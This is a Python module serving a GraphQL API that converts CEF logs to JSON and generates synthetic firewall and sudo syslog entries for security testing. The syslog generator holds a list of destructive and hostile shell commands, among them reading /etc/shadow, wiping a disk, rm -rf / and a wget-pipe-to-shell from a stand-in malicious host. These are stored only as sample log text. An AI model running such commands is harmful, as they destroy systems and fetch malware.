from pydantic import BaseModel
import strawberry
from .converters import cef_to_json
from faker import Faker
import requests
fake = Faker()

# Helper functions


def get_malicious_ips():
    url = "http://cinsscore.com/list/ci-badguys.txt"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.strip().split("\n")
    else:
        return []


malicious_ips = get_malicious_ips()


# Log fakers

def generate_random_cef_log():
    src_ip = fake.ipv4()
    dst_ip = fake.random_element(elements=malicious_ips) if malicious_ips else fake.ipv4()
    src_port = fake.random_int(min=1024, max=65535)
    dst_port = fake.random_int(min=1024, max=65535)
    protocol = fake.random_element(elements=('TCP', 'UDP'))
    action = fake.random_element(elements=('ALLOW', 'DENY'))
    event_description = f"Firewall {action} {protocol} traffic from {src_ip}:{src_port} to {dst_ip}:{dst_port}"

    version = fake.numerify("1.0.#")  # Creates a version number like "1.0.3"

    cef_log = f"CEF:0|{fake.company()}|Firewall|{version}|{fake.uuid4()}|{event_description}|{fake.random_int(min=1, max=10)}|src={src_ip} spt={src_port} dst={dst_ip} dpt={dst_port} proto={protocol} act={action}"
    return cef_log


def generate_fake_syslog_message():
    # Customize this function to generate syslog messages with the desired fields and format
    timestamp = fake.date_time_this_year()
    hostname = fake.hostname()
    user = fake.user_name()
    process = "sudo"
    pid = fake.random_int(min=1000, max=65535)
    action = "COMMAND"

    # List of high-risk commands
    high_risk_commands = [
        "cat /etc/shadow",
        "dd if=/dev/zero of=/dev/sda",
        "rm -rf /",
        "find / -name '*.log' -exec rm -f {} \\;",
        "wget -O- http://malicious.example.com/malware | sh",
        "iptables -F",
        "chmod -R 777 /",
        "chown -R nobody:nogroup /"
    ]

    command = fake.random_element(elements=high_risk_commands)

    syslog_message = f"{timestamp.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {user} : {action} ; {command}"
    return syslog_message


@strawberry.type
class ConvertCEFOutput:
    json_log: str


@strawberry.type
class Query:
    @strawberry.field
    def convert_cef_to_json(self, cef_log: str) -> ConvertCEFOutput:
        json_log = cef_to_json(cef_log)
        return ConvertCEFOutput(json_log=json_log)

    @strawberry.field
    def generate_random_cef_log(self) -> str:
        return generate_random_cef_log()

    @strawberry.field
    def generate_fake_syslog_message(self) -> str:
        return generate_fake_syslog_message()


schema = strawberry.Schema(query=Query)
